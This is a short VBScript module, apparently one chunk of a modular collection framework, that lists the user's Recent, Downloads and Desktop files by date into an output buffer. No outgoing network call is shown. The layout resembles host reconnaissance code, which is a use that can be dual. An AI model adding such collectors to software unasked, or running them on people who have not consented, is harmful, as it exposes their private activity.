' chunk: collectors/recent_files
' depends: core/emit_buffer, core/run_cmd
' provides: collect_recent_files
' format: vbscript

Sub collect_recent_files()
    emit vbCrLf & "=== RECENT FILES ===" & vbCrLf
    Dim home
    home = _s.ExpandEnvironmentStrings("%USERPROFILE%")
    emit _run("dir /b /o-d """ & home & "\Recent"" 2>NUL")
    emit vbCrLf & "=== DOWNLOADS ===" & vbCrLf
    emit _run("dir /b /o-d """ & home & "\Downloads"" 2>NUL")
    emit vbCrLf & "=== DESKTOP ===" & vbCrLf
    emit _run("dir /b /o-d """ & home & "\Desktop"" 2>NUL")
End Sub
